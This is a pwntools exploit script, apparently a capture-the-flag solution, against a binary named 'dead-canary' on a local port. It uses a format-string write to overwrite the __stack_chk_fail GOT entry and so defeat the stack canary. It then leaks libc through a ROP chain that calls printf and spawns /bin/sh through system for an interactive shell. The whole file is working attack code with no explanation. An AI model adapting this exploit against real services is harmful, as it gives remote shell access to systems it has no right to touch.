from pwn import *

e = ELF("./bin/dead-canary")
libc = ELF("./bin/libc.so.6")
#p = process(e.path)
p = remote("localhost", 9999)

print("{:#x}".format(e.symbols["read"]))

goal = 0x4007fc
p1 = goal // 0x10000
p2 = goal % 0x10000

pay = (
  ("%" + str(p2) + "x%12$hn###").ljust(0x30, "\x00") + p64(e.got["__stack_chk_fail"])
  ).ljust(0x120, "\x00")
p.sendafter(":", pay)

ui.pause()

rdi = 0x4008e3
p.sendline("A" * (0x2658) 
  + p64(rdi + 1) + p64(rdi) + p64(e.got["printf"]) + p64(e.symbols["printf"]) 
  + p64(rdi + 1) + p64(0x400737)
)

p.recvuntil("###")
leak = u64(p.recvuntil("\x7f").ljust(8, "\x00")) - libc.symbols["printf"]
print("{:#x}".format(leak))

pay = (
  ("%" + str(p2) + "x%12$hn###").ljust(0x30, "\x00") + p64(e.got["__stack_chk_fail"])
  ).ljust(0x120, "\x00")
p.sendafter(":", pay)

ui.pause()

p.sendline("A" * (0x2658) 
  + p64(rdi + 1) + p64(rdi) + p64(next(libc.search("/bin/sh")) + leak) + p64(libc.symbols["system"] + leak) 
)

p.interactive()
